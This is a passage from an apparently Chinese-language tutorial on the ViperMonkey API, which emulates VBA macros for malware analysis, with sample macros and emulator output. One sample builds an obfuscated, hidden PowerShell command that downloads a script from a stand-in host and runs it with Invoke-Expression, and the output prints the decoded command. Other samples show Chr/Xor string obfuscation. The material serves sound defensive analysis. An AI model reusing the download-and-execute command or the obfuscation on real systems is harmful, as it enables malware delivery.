代码</h3><p>解析源代码是一项艰巨的任务，在不需要触发其解析的内容下，ViperMonkey 可以通过使用 Module 对象来检查模块中的函数和子例程。对于模块类型的对象，你可以使用 <code>.procedures</code>，<code>.functions</code>，<code>.subs</code> 或 <code>.entry_points</code> 属性去访问 VBA 函数，同样可在不需要触发其解析的内容下确定函数名称。<code>.procedures</code> 是 <code>.function</code> 和 <code>.subs</code> 的组合，<code>.entry_points</code> 提供了在一个模块中包含函数的列表，这些函数为在 MS Office 中经常被触发 (例如 Document_Open)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Attribute VB_Name = &quot;ThisDocument&quot;</span></span><br><span class="line"><span class="string">Attribute VB_Base = &quot;1Normal.ThisDocument&quot;</span></span><br><span class="line"><span class="string">Sub Document_Open()</span></span><br><span class="line"><span class="string">    On Error Resume Next</span></span><br><span class="line"><span class="string">    Dim message As String</span></span><br><span class="line"><span class="string">    message = PrintHello(&quot;Jamie&quot;)</span></span><br><span class="line"><span class="string">    MsgBox message</span></span><br><span class="line"><span class="string">End Sub</span></span><br><span class="line"><span class="string">Function PrintHello(person As String) As String</span></span><br><span class="line"><span class="string">    Dim m1 As String</span></span><br><span class="line"><span class="string">    m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">    PrintHello = m1 &amp; person</span></span><br><span class="line"><span class="string">End Function</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">module = vipermonkey.Module(vba_code)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;FUNCTIONS and SUBS: &#x27;</span></span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> module.procedures:</span><br><span class="line">    <span class="built_in">print</span> func.name</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FUNCTIONS and SUBS: </span><br><span class="line">Document_Open</span><br><span class="line">PrintHello</span><br></pre></td></tr></table></figure><h3 id="Code-Blocks"><a href="#Code-Blocks" class="headerlink" title="Code Blocks"></a>Code Blocks</h3><p>Module 对象是 CodeBlock 对象的一种类型，code block 是作为单元工作的任何逻辑 code block (例如，函数，子例程，循环，单行代码等)。每个 CodeBlock 对象中可以嵌入 0 个或多个 code blocks，可以使用 <code>.code_blocks</code> 属性对其进行迭代。</p><div class="tip "><p>提示：从技术上讲，CodeBlock 是 VBA_Object 类的封装，因此它可以提供按需获取检索已解析属性的方法。因此，code block 和 object 将互换使用。</p></div><ul><li><code>Module</code> 对象是顶级 code block</li><li>每个 code block 都有基于类型的不同属性 (可以使用 <code>.type</code> 属性确定)</li><li>可以使用 <code>str()</code> 访问给定 code block 的原始代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;TYPE: &quot;</span>, code_block.<span class="built_in">type</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;CODE:\n&quot;</span>, <span class="built_in">str</span>(code_block)</span><br><span class="line">    <span class="keyword">if</span> code_block.<span class="built_in">type</span> == vipermonkey.Function:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Found a function: &#123;&#125;(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            code_block.name, <span class="string">&#x27;, &#x27;</span>.join(p.name <span class="keyword">for</span> p <span class="keyword">in</span> code_block.params))</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Attribute_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Attribute VB_Name = &quot;ThisDocument&quot;</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Attribute_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Attribute VB_Base = &quot;1Normal.ThisDocument&quot;</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.procedures.Sub&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Sub Document_Open()</span><br><span class="line">    On Error Resume Next</span><br><span class="line">    Dim message As String</span><br><span class="line">    message = PrintHello(&quot;Jamie&quot;)</span><br><span class="line">    MsgBox message</span><br><span class="line">End Sub</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.procedures.Function&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">Function PrintHello(person As String) As String</span><br><span class="line">    Dim m1 As String</span><br><span class="line">    m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span><br><span class="line">    PrintHello = m1 &amp; person</span><br><span class="line">End Function</span><br><span class="line">Found a function: PrintHello(person)</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：没有解析函数中的任何代码，目的是提供按需解析，以加快处理速度。要解析一个函数，你需要检索该函数的 code block，然后对其内部的 code block 进行迭代。</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="keyword">if</span> code_block.<span class="built_in">type</span> == vipermonkey.Function:</span><br><span class="line">        <span class="keyword">for</span> inner_code_block <span class="keyword">in</span> code_block.code_blocks:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;TYPE: &quot;</span>, inner_code_block.<span class="built_in">type</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;CODE:\n&quot;</span>, <span class="built_in">str</span>(inner_code_block)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Dim_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">    Dim m1 As String</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Let_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">    m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span><br><span class="line">TYPE:  &lt;class &#x27;vipermonkey.core.statements.Let_Statement&#x27;&gt;</span><br><span class="line">CODE:</span><br><span class="line">    PrintHello = m1 &amp; person</span><br></pre></td></tr></table></figure><h3 id="评估-Code-Blocks"><a href="#评估-Code-Blocks" class="headerlink" title="评估 Code Blocks"></a>评估 Code Blocks</h3><p>可以使用 eval() 或 load_context() 函数来评估各个 code block，这些函数接受 Context 对象作为参数，在评估时，将以递归方式评估所有嵌入的 code block。eval() 会运行一个正确范围内的 code block，并在适当的情况下返回结果。会对提供的 context 产生影响，为 eval() 提供上下文是可选的。例如，你可以遍历模块的 code block 以找到 PrintHello 函数，然后使用自己的参数对其进行评估</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="keyword">if</span> code_block.<span class="built_in">type</span> == vipermonkey.Function <span class="keyword">and</span> code_block.name == <span class="string">&#x27;PrintHello&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> code_block.<span class="built_in">eval</span>(params=[<span class="string">&#x27;Bob&#x27;</span>])</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello Bob</span><br></pre></td></tr></table></figure><p>load_context() 直接在给定 context 的范围内评估 code block 的内容，这样你就可以在之后去检查 context。</p><p>load_context() 等效于分别评估每个 sub code block</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sub_code_block <span class="keyword">in</span> code_block.code_blocks:</span><br><span class="line">   sub_code_block.<span class="built_in">eval</span>(context=context)</span><br></pre></td></tr></table></figure><p>在 Module 对象上使用此函数时，声明 Functions 和 Subs 时不会评估其外部的行。</p><p>使用上面已经声明的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context = vipermonkey.Context()</span><br><span class="line">module.load_context(context)</span><br><span class="line"><span class="built_in">print</span> vipermonkey.<span class="built_in">eval</span>(<span class="string">&#x27;PrintHello(&quot;Bob&quot;)&#x27;</span>, context=context)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello Bob</span><br></pre></td></tr></table></figure><h3 id="通用-CodeBlock-和-VBA-Object-类型"><a href="#通用-CodeBlock-和-VBA-Object-类型" class="headerlink" title="通用 CodeBlock 和 VBA_Object 类型"></a>通用 CodeBlock 和 VBA_Object 类型</h3><p>以下是你将遇到的一些常见 CodeBlock 或 VBA_Object 类型的列表</p><span class='p blue'>模块</span><p>顶层 Code blocks，包含所有全局变量和函数/子模块</p><ul><li><code>.functions</code> – Functions 中的 Code blocks</li><li><code>.sub - Subs</code> 中的 Code blocks (这些与 function 相同，但不返回任何内容)</li><li><code>.procedures</code> – Functions 和 Subs 中的 Code blocks</li><li><code>.entry_points</code> – 作为宏入口点 (Document_Open, AutoOpen 等等) 的 Functions/Subs</li><li><code>.global_vars</code> – 在模块中找到全局变量字典以及它们的值</li><li><code>.attribute</code> – 包含宏属性值的字典</li></ul><span class='p blue'>Function/Sub</span><ul><li><code>.name</code> – Function 或 Sub 的名称</li><li><code>.param</code> – 参数对象的列表</li><li><code>.return_type - function</code> 返回的变量类型 (只针对 Function)</li></ul><span class='p blue'>Call_Statement/Function_Call</span><p>调用给定的函数，可以在自己的行 (Call_Statement) 或另外行上的部分找到</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PrintHello(&quot;Bob&quot;)</span><br><span class="line">Shell &quot;powershell.exe ...&quot;</span><br></pre></td></tr></table></figure><ul><li><code>.name</code> – 所调用函数的名称或对象</li><li><code>.params</code> – 传递给函数的参数列表 (参数可以是字符串或其他对象)</li></ul><span class='p blue'>Global_Var_Statement</span><p>变量的声明</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo = <span class="string">&#x27;bar&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><code>.name</code> – 要设置的变量名称 (可以是诸如 <code>MemberAccessExpression</code> 之类的对象)</li><li><code>.value</code> – 值设置为变量 (可以是对象)</li></ul><span class='p blue'>Let_Statement</span><p>分配非对象值 (<code>Let</code> 关键字本身是可选的，可以省略)</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Let</span> PrintHello = m1 &amp; person</span><br></pre></td></tr></table></figure><ul><li><code>.name</code> – 变量名</li><li><code>.expression</code> – 要设置的变量的值</li><li><code>.index</code> – 变量的索引 ，可选的</li></ul><span class='p blue'>MemberAccessExpression</span><p>表示访问对象属性或函数的表达式</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ThisDocument.Tables(<span class="number">1</span>).Cell(<span class="number">1</span>, <span class="number">1</span>).Range.<span class="keyword">Text</span></span><br></pre></td></tr></table></figure><ul><li><code>.lhs</code> – 第一个成员对象 (<code>ThisDocument</code>)</li><li><code>.rhs</code> – 其余成员的列表 (<code>[Tables(&#39;1&#39;), Cell(&#39;1, 1&#39;), &#39;Range&#39;, &#39;Text&#39;]</code>)</li></ul><h3 id="提取释放的文件"><a href="#提取释放的文件" class="headerlink" title="提取释放的文件"></a>提取释放的文件</h3><p><code>Context</code> 对象将跟踪创建的文件，使用 <code>opened_files</code> 或 <code>closed_files</code> 可实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Sub WriteFile(data As String)</span></span><br><span class="line"><span class="string">    Dim a, b, c As String</span></span><br><span class="line"><span class="string">    a = &quot;Scr&quot;</span></span><br><span class="line"><span class="string">    b = &quot;ipting&quot; &amp; Chr(46) &amp; &quot;FileSy&quot;</span></span><br><span class="line"><span class="string">    c = &quot;st&quot; &amp; Chr(69) &amp; &quot;mObject&quot;</span></span><br><span class="line"><span class="string">    Dim fso As Object</span></span><br><span class="line"><span class="string">    Set fso = CreateObject(a &amp; b &amp; c)</span></span><br><span class="line"><span class="string">    Dim Fileout As Object</span></span><br><span class="line"><span class="string">    Dim url As String</span></span><br><span class="line"><span class="string">    url = &quot;c:\users\public\&quot; &amp; &quot;documents\hello.txt&quot;</span></span><br><span class="line"><span class="string">    Set Fileout = fso.CreateTextFile(url, True, True)</span></span><br><span class="line"><span class="string">    Fileout.Write data</span></span><br><span class="line"><span class="string">    Fileout.Close</span></span><br><span class="line"><span class="string">End Sub</span></span><br><span class="line"><span class="string">WriteFile(&quot;This &quot; &amp; &quot;is some&quot; &amp; &quot; file data!&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br><span class="line"><span class="built_in">print</span> context.closed_files</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;c:\\users\\public\\documents\\hello.txt&#x27;: &#x27;This is some file data!&#x27;&#125;</span><br></pre></td></tr></table></figure><h3 id="替代函数"><a href="#替代函数" class="headerlink" title="替代函数"></a>替代函数</h3><p>Python 实现的一些函数可替代 Function 或 Sub，这有助于加快已知函数的解析速度，或替代由于复杂性而最有可能失败的函数。若要替代函数，请使用接受两个参数 (<code>context</code> 和 <code>params</code>) 的函数，用返回的结果来更新 Context 对象的全局字典值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Public Function Base64Decode(ByVal s As String) As Byte()</span></span><br><span class="line"><span class="string">    &#x27; Some complex code</span></span><br><span class="line"><span class="string">End Function</span></span><br><span class="line"><span class="string">Public Sub Document_Open()</span></span><br><span class="line"><span class="string">    Dim result As String</span></span><br><span class="line"><span class="string">    result = Base64Decode(&quot;aGVsbG8gd29ybGQh&quot;)</span></span><br><span class="line"><span class="string">Enc Sub</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">replaced_base64</span>(<span class="params">context, params</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(params[<span class="number">0</span>])</span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">module = vipermonkey.Module(vba_code)</span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> The function should be replaced after the context is evaluated by the module. Otherwise the module will replace your function.</span></span><br><span class="line">module.load_context(context)</span><br><span class="line">context.<span class="built_in">globals</span>[<span class="string">&#x27;Base64Decode&#x27;</span>] = replaced_base64</span><br><span class="line">document_open = context[<span class="string">&#x27;Document_Open&#x27;</span>]</span><br><span class="line">document_open.load_context(context)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;DECODED DATA: &quot;</span>, context[<span class="string">&#x27;result&#x27;</span>]</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DECODED DATA:  hello world!</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：由于 Base64 的替代函数非常普遍，因此已经为你实现了此函数，可以使用 vipermonkey.Base64DecodeString</p></div><h3 id="记录行为"><a href="#记录行为" class="headerlink" title="记录行为"></a>记录行为</h3><p>在仿真模拟过程中，ViperMonkey 记录了独特而有趣的行为，这些行为会对外部系统产生影响 (例如，释放的文件，命令执行和 HTTP 请求)。可以从 Context 对象的 <code>.actions</code> 属性进行这些操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Public Function Execute() As Variant</span></span><br><span class="line"><span class="string">Dim m1, m2, m3, m4 As String</span></span><br><span class="line"><span class="string">m1 = &quot;p&quot; &amp; &quot;o&quot; &amp; &quot;w&quot; &amp; &quot;e&quot; &amp; &quot;r&quot; &amp; &quot;s&quot; &amp; &quot;h&quot; &amp; &quot;e&quot; &amp; &quot;l&quot; &amp; &quot;l&quot; &amp; &quot; &quot; &amp; &quot;-&quot; &amp; &quot;w&quot; &amp; &quot; &quot; &amp; &quot;h&quot; &amp; &quot;i&quot; &amp; &quot;d&quot; &amp; &quot;d&quot; &amp; &quot;e&quot;</span></span><br><span class="line"><span class="string">m2 = &quot;n&quot; &amp; &quot; -&quot; &amp; &quot;e&quot; &amp; &quot;x&quot; &amp; &quot;e&quot; &amp; &quot;c&quot; &amp; &quot; b&quot; &amp; &quot;y&quot; &amp; &quot;p&quot; &amp; &quot;a&quot; &amp; &quot;s&quot; &amp; &quot;s &quot; &amp; &quot;-&quot; &amp; &quot;c &quot; &amp; Chr(34)</span></span><br><span class="line"><span class="string">m3 = &quot;$a&quot; &amp; &quot;=&quot; &amp; &quot;Invoke&quot; &amp; &quot;-&quot; &amp; &quot;We&quot; &amp; &quot;bRequest&quot; &amp; &quot; ww&quot; &amp; &quot;w.example.com&quot; &amp; &quot;/&quot; &amp; &quot;scr&quot; &amp; &quot;ipt.txt&quot;</span></span><br><span class="line"><span class="string">m4 = &quot;; &quot; &amp; &quot;Inv&quot; &amp; &quot;ok&quot; &amp; &quot;e-Expr&quot; &amp; &quot;ession &quot; &amp; &quot;$&quot; &amp; &quot;a&quot; &amp; Chr(34) &amp; &quot;&quot;</span></span><br><span class="line"><span class="string">Shell m1 &amp; m2 &amp; m3 &amp; m4, vbHide</span></span><br><span class="line"><span class="string">WinExec &quot;wscript powershell.exe -x run.ps1&quot;, 0</span></span><br><span class="line"><span class="string">End Function</span></span><br><span class="line"><span class="string">Execute</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br><span class="line"><span class="keyword">for</span> description, actions <span class="keyword">in</span> context.actions.iteritems():</span><br><span class="line">    <span class="built_in">print</span> description, <span class="string">&#x27;====&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">        <span class="built_in">print</span> action</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Shell function ====</span><br><span class="line">(&#x27;Execute Command&#x27;, &#x27;powershell -w hidden -exec bypass -c &quot;$a=Invoke-WebRequest www.example.com/script.txt; Invoke-Expression $a&quot;&#x27;)</span><br><span class="line">Interesting Function Call ====</span><br><span class="line">(&#x27;WinExec&#x27;, [&#x27;wscript powershell.exe -x run.ps1&#x27;, 0])</span><br><span class="line">Interesting Command Execution ====</span><br><span class="line">(&#x27;Run&#x27;, &#x27;wscript powershell.exe -x run.ps1&#x27;)</span><br></pre></td></tr></table></figure><p>你也可以在 Context 对象中提供自己的回调函数以记录行为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">report_shell</span>(<span class="params">action, params=<span class="literal">None</span>, description=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> action == <span class="string">&#x27;Execute Command&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;FOUND A COMMAND: &quot;</span>, params</span><br><span class="line">context = vipermonkey.Context(report_action=report_shell)</span><br><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, context=context)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOUND A COMMAND:  powershell -w hidden -exec bypass -c &quot;$a=Invoke-WebRequest www.example.com/script.txt; Invoke-Expression $a&quot;</span><br></pre></td></tr></table></figure><h3 id="提高速度"><a href="#提高速度" class="headerlink" title="提高速度"></a>提高速度</h3><p>当使用到一个属性 (<code>.type</code>，<code>.name</code>，<code>.params</code> 等) 或调用 <code>eval()</code> 时会对 CodeBlock 对象进行解析。但是，调用 <code>str()</code> 不会触发解析，你可以利用这一点来跳过多余的行或可用行，从而加快处理速度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dim SHxPqkwrGNbtKCbuMMuOwkEnjTCFyQYVofmDhUQO As String</span></span><br><span class="line"><span class="string">Dim HInhBKXjdKldXUzKfBJGXAlBvSvqyiFkewQMeKCj As String</span></span><br><span class="line"><span class="string">Dim pRFxhIaLPubbdOiMdqXdORFsxSLGEoyqXCaKHNtT As String</span></span><br><span class="line"><span class="string">Dim uKWKPzXumrqVToeYfOEBgPSGrPxQuHjXJJDWgfTU As String</span></span><br><span class="line"><span class="string">Dim mIJOHatpQXHVoIHwnThJcipbyvwvJqJeGduHDfgY As String</span></span><br><span class="line"><span class="string">Dim m1, m2, m3 As String</span></span><br><span class="line"><span class="string">m1 = &quot;he&quot; &amp; &quot;ll&quot; &amp; Chr(111) &amp; &quot; &quot;</span></span><br><span class="line"><span class="string">m2 = &quot;w&quot; &amp; Chr(111) &amp; &quot;rl&quot; &amp; Chr(123 Xor 31)</span></span><br><span class="line"><span class="string">m3 = &quot;!!!&quot;</span></span><br><span class="line"><span class="string">result = m1 &amp; 2 &amp; m3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">context = vipermonkey.Context()</span><br><span class="line">module = vipermonkey.Module(vba_code)</span><br><span class="line"><span class="keyword">for</span> code_block <span class="keyword">in</span> module.code_blocks:</span><br><span class="line">    <span class="comment"># Skip parsing the large number of unnecessary variable declarations.</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#x27;Dim [A-Za-z]&#123;40&#125; As String&#x27;</span>, <span class="built_in">str</span>(code_block)):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    code_block.<span class="built_in">eval</span>(context)</span><br><span class="line"><span class="built_in">print</span> context[<span class="string">&#x27;result&#x27;</span>]</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world!!!</span><br></pre></td></tr></table></figure><h3 id="去混淆"><a href="#去混淆" class="headerlink" title="去混淆"></a>去混淆</h3><p>ViperMonkey 包含一个去混淆实用程序，可在仿真模拟之前帮助清理代码。这可以极大地帮助加快解析速度，若要使用，请在解析/模拟之前使用 <code>deobfuscate()</code> 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vipermonkey</span><br><span class="line">vba_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ZOOP = Chr(123 Xor 11)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(122 Xor 14)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(109 Xor 4)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(99 Xor 13)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(97 Xor 6) &amp; Chr(34 Xor 12) &amp; Chr(67 Xor 5) &amp; Chr(109 Xor 4)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(109 Xor 1) + Chr(69) + Chr(81 Xor 2)</span></span><br><span class="line"><span class="string">ZOOP = ZOOP &amp; Chr(107 Xor 18)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> vipermonkey.deobfuscate(vba_code)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZOOP = &quot;pting.FilESy&quot;</span><br></pre></td></tr></table></figure><p>除了上述这种方法外，你也可以通过在 <code>vipermonkey.eval()</code> 或 <code>vipermonkey.Module()</code> 中设置 <code>deobfuscate</code> 关键字参数来触发去混淆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vipermonkey.<span class="built_in">eval</span>(vba_code, deobfuscate=<span class="literal">True</span>)</span><br><span class="line">module = vipermonkey.Module(vba_code, deobfuscate=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" 